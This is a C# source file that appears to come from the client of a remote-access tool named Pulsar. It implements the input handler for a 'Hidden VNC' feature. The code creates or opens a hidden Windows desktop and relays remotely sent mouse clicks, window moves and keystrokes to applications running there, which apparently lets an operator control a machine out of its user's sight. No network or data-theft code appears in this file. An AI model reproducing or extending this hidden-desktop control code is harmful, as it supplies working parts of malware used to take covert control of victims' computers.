using Pulsar.Common.Enums;
using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Pulsar.Client.Helper.HVNC
{
    /// <summary>
    /// Handles input for the Hidden Virtual Network Computing (HVNC) feature.
    /// </summary>
    public class InputHandler : IDisposable
    {
        #region Win32 API Imports

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        private static extern IntPtr WindowFromPoint(POINT point);

        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        private static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        [DllImport("user32.dll")]
        private static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, POINT point);

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern bool PtInRect(ref RECT lprc, POINT pt);

        [DllImport("user32.dll")]
        private static extern bool SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll")]
        private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        private static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern int MenuItemFromPoint(IntPtr hWnd, IntPtr hMenu, POINT pt);

        [DllImport("user32.dll")]
        private static extern int GetMenuItemID(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSubMenu(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        private static extern bool MoveWindow(IntPtr hWnd, int x, int y, int width, int height, bool repaint);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, int cchType);

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

        [DllImport("user32.dll")]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool IsWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool PrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

        [DllImport("user32.dll")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        
        [DllImport("user32.dll")]
        private static extern bool GetClientRect(IntPtr hWnd, out RECT lpRect);
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        #endregion

        #region Constants

        // Window style constants
        private const int GWL_STYLE = -16;
        private const int WS_DISABLED = 0x8000000;

        // Window message constants
        private const int WM_CHAR = 0x0102;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_LBUTTONUP = 0x0202;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_MOUSEMOVE = 0x0200;
        private const int WM_CLOSE = 0x0010;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int WM_NCHITTEST = 0x0084;
        private const int WM_RBUTTONUP = 0x0205;
        private const int WM_RBUTTONDOWN = 0x0204;
        private const int WM_DESTROY = 0x0002;

        // Mouse button constants
        private const int MK_LBUTTON = 0x0001;
        private const int MK_RBUTTON = 0x0002;

        // System command constants
        private const int SC_MINIMIZE = 0xF020;
        private const int SC_RESTORE = 0xF120;
        private const int SC_MAXIMIZE = 0xF030;

        // Hit test area constants
        private const int HTCAPTION = 2;
        private const int HTTOP = 12;
        private const int HTBOTTOM = 15;
        private const int HTLEFT = 10;
        private const int HTRIGHT = 11;
        private const int HTTOPLEFT = 13;
        private const int HTTOPRIGHT = 14;
        private const int HTBOTTOMLEFT = 16;
        private const int HTBOTTOMRIGHT = 17;
        private const int HTCLOSE = 20;
        private const int HTMINBUTTON = 8;
        private const int HTMAXBUTTON = 9;
        private const int HTTRANSPARENT = -1;

        // Window enumeration constants
        private const uint GW_HWNDPREV = 3;
        private const uint GW_HWNDNEXT = 2;

        // Miscellaneous constants
        private const int VK_RETURN = 0x0D;
        private const int MN_GETHMENU = 0x01E1;
        private const int BM_CLICK = 0x00F5;
        private const int MAX_PATH = 260;
        private const int SW_SHOWMAXIMIZED = 3;
        private const int SW_RESTORE = 9;

        #endregion

        #region Fields and Properties

        private readonly string desktopName;
        private bool isMovingWindow = false;
        private POINT lastClickCoords = new POINT { x = 0, y = 0 };
        private POINT lastWindowDimensions = new POINT { x = 0, y = 0 };
        private IntPtr windowToMove = IntPtr.Zero;
        private IntPtr workingWindow = IntPtr.Zero;
        private static readonly object syncLock = new object();

        /// <summary>
        /// Gets the desktop handle.
        /// </summary>
        public IntPtr Desktop { get; private set; } = IntPtr.Zero;

        #endregion

        #region Constructor and Dispose

        /// <summary>
        /// Initializes a new instance of the <see cref="InputHandler"/> class.
        /// </summary>
        /// <param name="desktopName">The name of the desktop to handle input for.</param>
        public InputHandler(string desktopName)
        {
            this.desktopName = desktopName;
            IntPtr desktopHandle = OpenDesktop(desktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (desktopHandle == IntPtr.Zero)
            {
                desktopHandle = CreateDesktop(desktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            this.Desktop = desktopHandle;
        }

        /// <summary>
        /// Releases all resources used by the InputHandler.
        /// </summary>
        public void Dispose()
        {
            CloseDesktop(this.Desktop);
            GC.Collect();
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Gets the X coordinate from an lParam.
        /// </summary>
        public static int GetXCoordinate(IntPtr lParam)
        {
            return (int)((short)(lParam.ToInt32() & 0xFFFF));
        }

        /// <summary>
        /// Gets the Y coordinate from an lParam.
        /// </summary>
        public static int GetYCoordinate(IntPtr lParam)
        {
            return (int)((short)(lParam.ToInt32() >> 16 & 0xFFFF));
        }

        /// <summary>
        /// Creates an lParam from X and Y coordinates.
        /// </summary>
        public static IntPtr MakeLParam(int lowWord, int highWord)
        {
            return new IntPtr(highWord << 16 | (lowWord & 0xFFFF));
        }

        /// <summary>
        /// Calculates relative coordinates from screen to window
        /// </summary>
        private POINT ScreenToWindow(int screenX, int screenY, int windowX, int windowY, int windowWidth, int windowHeight)
        {
            int relativeX = screenX - windowX;
            int relativeY = screenY - windowY;

            if (relativeX >= 0 && relativeX < windowWidth && relativeY >= 0 && relativeY < windowHeight)
                return new POINT { x = relativeX, y = relativeY };
            else
                return new POINT { x = -1, y = -1 };
        }

        #endregion

        #region Input Processing

        /// <summary>
        /// Processes an input message and sends it to the appropriate window.
        /// </summary>
        /// <param name="msg">The message to process.</param>
        /// <param name="wParam">The wParam of the message.</param>
        /// <param name="lParam">The lParam of the message.</param>
        public void Input(uint msg, IntPtr wParam, IntPtr lParam)
        {
            lock (syncLock)
            {
                SetThreadDesktop(this.Desktop);

                // Handle mouse messages
                if (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP || 
                    msg == WM_RBUTTONDOWN || msg == WM_RBUTTONUP || 
                    msg == WM_MOUSEMOVE)
                {
                    int x = GetXCoordinate(lParam);
                    int y = GetYCoordinate(lParam);
                    POINT cursorPosition = new POINT { x = x, y = y };
                    
                    bool isLeft = (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP);
                    bool isUp = (msg == WM_LBUTTONUP || msg == WM_RBUTTONUP);

                    if (isMovingWindow && isUp && isLeft)
                    {
                        // If we were moving a window and now released the button, complete the move
                        SetWindowPos(windowToMove, IntPtr.Zero, 
                            x - lastClickCoords.x, 
                            y - lastClickCoords.y,
                            lastWindowDimensions.x, 
                            lastWindowDimensions.y, 
                            0);
                        isMovingWindow = false;
                    }

                    // Get the window under the cursor
                    IntPtr hwnd = WindowFromPoint(cursorPosition);
                    workingWindow = hwnd;

                    if (hwnd != IntPtr.Zero)
                    {
                        // Get window information
                        RECT windowRect;
                        GetWindowRect(hwnd, out windowRect);
                        
                        // Calculate window position and size
                        int windowX = windowRect.left;
                        int windowY = windowRect.top;
                        int windowWidth = windowRect.right - windowRect.left;
                        int windowHeight = windowRect.bottom - windowRect.top;
                        
                        // Calculate position relative to window
                        POINT clickCoords = ScreenToWindow(x, y, windowX, windowY, windowWidth, windowHeight);
                        
                        // Get hit test result to determine what part of the window was clicked
                        IntPtr hitTestResult = SendMessage(hwnd, WM_NCHITTEST, IntPtr.Zero, lParam);
                        int hitTestResultInt = hitTestResult.ToInt32();

                        if (hitTestResultInt == HTCLOSE && msg == WM_LBUTTONUP)
                        {
                            // Close button clicked
                            Debug.WriteLine("Closing window");
                            PostMessage(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                            PostMessage(hwnd, WM_DESTROY, IntPtr.Zero, IntPtr.Zero);
                        }
                        else if (hitTestResultInt == HTCAPTION)
                        {
                            // Title bar clicked
                            if (!isUp && isLeft && msg == WM_LBUTTONDOWN)
                            {
                                // Start window move operation
                                lastClickCoords = clickCoords;
                                lastWindowDimensions = new POINT { x = windowWidth, y = windowHeight };
                                isMovingWindow = true;
                                windowToMove = hwnd;
                                Debug.WriteLine("Starting window move");
                            }
                        }
                        else if (hitTestResultInt == HTMAXBUTTON && msg == WM_LBUTTONUP)
                        {
                            // Maximize/Restore button clicked
                            WINDOWPLACEMENT windowPlacement = default;
                            windowPlacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowPlacement);
                            GetWindowPlacement(hwnd, ref windowPlacement);
                            
                            if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
                            {
                                Debug.WriteLine("Restoring window");
                                PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
                            }
                            else
                            {
                                Debug.WriteLine("Maximizing window");
                                PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
                            }
                        }
                        else if (hitTestResultInt == HTMINBUTTON && msg == WM_LBUTTONUP)
                        {
                            // Minimize button clicked
                            Debug.WriteLine("Minimizing window");
                            PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
                        }
                        else
                        {
                            // Regular window area clicked - forward the mouse message
                            IntPtr param = isLeft ? new IntPtr(MK_LBUTTON) : new IntPtr(MK_RBUTTON);
                            IntPtr translatedLParam = MakeLParam(clickCoords.x, clickCoords.y);
                            PostMessage(hwnd, msg, param, translatedLParam);
                        }
                    }
                }
                // Handle keyboard messages
                if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
                {
                    if (workingWindow != IntPtr.Zero)
                    {
                        // Example: build appropriate lParam for key up with scan code
                        IntPtr keyMapParam = IntPtr.Zero;
                        if (msg == WM_KEYUP)
                        {
                            int scanCode = wParam.ToInt32();
                            keyMapParam = new IntPtr((scanCode << 16) | 0xC0000000);
                        }

                        PostMessage(workingWindow, msg, wParam, keyMapParam);
                    }
                }
            }
        }

        #endregion

        #region Nested Types

        /// <summary>
        /// Desktop access rights flags.
        /// </summary>
        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE,
            DESKTOP_READOBJECTS,
            DESKTOP_CREATEWINDOW,
            DESKTOP_CREATEMENU = 4U,
            DESKTOP_HOOKCONTROL = 8U,
            DESKTOP_JOURNALRECORD = 16U,
            DESKTOP_JOURNALPLAYBACK = 32U,
            DESKTOP_ENUMERATE = 64U,
            DESKTOP_WRITEOBJECTS = 128U,
            DESKTOP_SWITCHDESKTOP = 256U,
            GENERIC_ALL = 511U
        }

        /// <summary>
        /// Represents a point (x,y coordinates).
        /// </summary>
        public struct POINT
        {
            public int x;
            public int y;
        }

        /// <summary>
        /// Represents a rectangle.
        /// </summary>
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        /// <summary>
        /// Contains information about the placement of a window.
        /// </summary>
        public struct WINDOWPLACEMENT
        {
            public int length;
            public int flags;
            public int showCmd;
            public POINT ptMinPosition;
            public POINT ptMaxPosition;
            public RECT rcNormalPosition;
        }

        #endregion
    }
}
